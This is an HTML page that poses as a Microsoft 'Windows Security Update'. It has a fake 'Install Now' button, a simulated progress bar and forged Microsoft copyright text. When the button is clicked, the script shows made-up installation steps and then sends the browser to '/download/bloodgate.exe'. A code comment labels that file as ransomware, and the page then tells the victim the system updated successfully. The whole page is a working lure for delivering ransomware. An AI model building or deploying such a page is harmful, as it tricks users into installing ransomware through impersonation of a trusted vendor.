<!DOCTYPE html>
<html>
<head>
    <title>Windows Security Update</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a1a;
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3e 100%);
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            padding: 50px;
            border-radius: 20px;
            text-align: center;
            max-width: 500px;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        .shield {
            font-size: 80px;
            margin-bottom: 20px;
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%,100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        h1 {
            font-size: 28px;
            background: linear-gradient(135deg, #00d4ff, #0088ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        .sub {
            color: #8899bb;
            font-size: 16px;
            margin-bottom: 30px;
        }
        .features {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 20px 0 30px;
        }
        .feature {
            text-align: center;
            color: #6688aa;
            font-size: 12px;
        }
        .feature span {
            font-size: 24px;
            display: block;
            margin-bottom: 5px;
        }
        .btn {
            background: linear-gradient(135deg, #00d4ff, #0088ff);
            color: white;
            border: none;
            padding: 18px 50px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 5px 30px rgba(0,136,255,0.3);
            width: 100%;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 40px rgba(0,136,255,0.5);
        }
        .btn:disabled {
            opacity:0.7;
            cursor:not-allowed;
            transform: none;
        }
        .progress {
            margin-top: 20px;
            display: none;
        }
        .bar {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
            overflow: hidden;
        }
        .fill {
            height: 100%;
            background: linear-gradient(90deg, #00d4ff, #0088ff);
            width: 0%;
            transition: width 0.5s;
            border-radius: 10px;
        }
        .status {
            margin-top: 10px;
            color: #6688aa;
            font-size: 14px;
        }
        .footer {
            margin-top: 20px;
            color: #334466;
            font-size: 12px;
        }
        .btc-show {
            color: #ff8800;
            font-size: 11px;
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid rgba(255,255,255,0.05);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="shield">🛡️</div>
        <h1>Windows Security Update</h1>
        <p class="sub">Critical security patch for your system</p>
        
        <div class="features">
            <div class="feature">
                <span>🔒</span>
                Advanced Protection
            </div>
            <div class="feature">
                <span>⚡</span>
                Performance Boost
            </div>
            <div class="feature">
                <span>🛡️</span>
                Real-time Security
            </div>
        </div>
        
        <button class="btn" id="installBtn">📥 Install Now</button>
        
        <div class="progress" id="progressDiv">
            <div class="bar">
                <div class="fill" id="progressFill"></div>
            </div>
            <div class="status" id="statusText">Preparing installation...</div>
        </div>
        
        <div class="btc-show">⚡ Version 2026.0 | Microsoft Corporation</div>
        <div class="footer">© 2026 Microsoft. All rights reserved.</div>
    </div>

    <script>
        document.getElementById('installBtn').addEventListener('click', function() {
            const btn = this;
            const progressDiv = document.getElementById('progressDiv');
            const progressFill = document.getElementById('progressFill');
            const statusText = document.getElementById('statusText');
            
            btn.disabled = true;
            btn.textContent = '⏳ Installing...';
            progressDiv.style.display = 'block';
            
            let progress = 0;
            const steps = [
                '🔄 Downloading updates...',
                '📦 Extracting files...',
                '🔧 Installing components...',
                '🛡️ Configuring security...',
                '✅ Installation complete!'
            ];
            let stepIndex = 0;
            
            const interval = setInterval(() => {
                progress += Math.random() * 5 + 2;
                if (progress > 100) progress = 100;
                progressFill.style.width = progress + '%';
                
                if (progress > stepIndex * 25 && stepIndex < steps.length - 1) {
                    stepIndex++;
                    statusText.textContent = steps[stepIndex];
                }
                
                if (progress >= 100) {
                    clearInterval(interval);
                    statusText.textContent = '✅ Installation complete!';
                    btn.textContent = '🔄 Restarting...';
                    
                    // Download the ransomware
                    setTimeout(() => {
                        window.location.href = '/download/bloodgate.exe';
                    }, 1000);
                    
                    setTimeout(() => {
                        btn.textContent = '✅ Done';
                        statusText.textContent = '🩸 System updated successfully';
                    }, 3000);
                }
            }, 300);
        });
    </script>
</body>
</html>
